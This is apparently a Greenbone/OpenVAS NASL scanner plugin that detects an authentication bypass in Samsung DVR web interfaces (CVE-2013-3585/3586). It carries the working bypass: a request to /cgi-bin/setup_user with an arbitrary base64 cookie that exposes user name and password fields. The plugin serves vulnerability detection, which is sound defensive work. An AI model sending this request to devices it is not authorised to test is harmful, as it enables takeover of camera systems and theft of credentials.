if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103770" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2013-3585", "CVE-2013-3586" );
	script_bugtraq_id( 61942, 61938 );
	script_tag( name: "cvss_base", value: "7.6" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:N/C:C/I:C/A:C" );
	script_name( "Samsung DVR Authentication Bypass" );
	script_xref( name: "URL", value: "http://www.kb.cert.org/vuls/id/882286" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/27753" );
	script_xref( name: "URL", value: "http://www.andreafabrizi.it/?exploits:samsung:dvr" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2013-08-21 14:27:11 +0200 (Wed, 21 Aug 2013)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "This vulnerability allows remote unauthenticated users to:

  - Get/set/delete username/password of local users (/cgi-bin/setup_user)

  - Get/set DVR/Camera general configuration

  - Get info about the device/storage

  - Get/set the NTP server

  - Get/set many other settings." );
	script_tag( name: "vuldetect", value: "Check if /cgi-bin/setup_user is accessible without authentication." );
	script_tag( name: "insight", value: "In most of the CGIs on the Samsung DVR, the session check is made
  in a wrong way, that allows to access protected pages simply putting an arbitrary cookie into the HTTP request." );
	script_tag( name: "solution", value: "Ask the Vendor for an update." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "The remote Samsung DVR is prone to an Authentication Bypass." );
	script_tag( name: "affected", value: "Samsung DVR with firmware version <= 1.10." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
port = http_get_port( default: 80 );
buf = http_get_cache( item: "/", port: port );
if(!ContainsString( buf, "<title>Web Viewer for Samsung DVR</title>" )){
	exit( 0 );
}
host = http_host_name( port: port );
req = "GET /cgi-bin/setup_user HTTP/1.1\r\n" + "Host: " + host + "\r\n" + "Connection: close\r\n";
result = http_send_recv( port: port, data: req + "\r\n", bodyonly: FALSE );
if(!ContainsString( result, "top.document.location.href" )){
	exit( 99 );
}
req += "Cookie: DATA1=YWFhYWFhYWFhYQ==\r\n\r\n";
result = http_send_recv( port: port, data: req + "\r\n", bodyonly: FALSE );
if(ContainsString( result, "<title>User</title>" ) && ContainsString( result, "nameUser_Name_0" ) && ContainsString( result, "nameUser_Pw_0" )){
	security_message( port: port );
	exit( 0 );
}

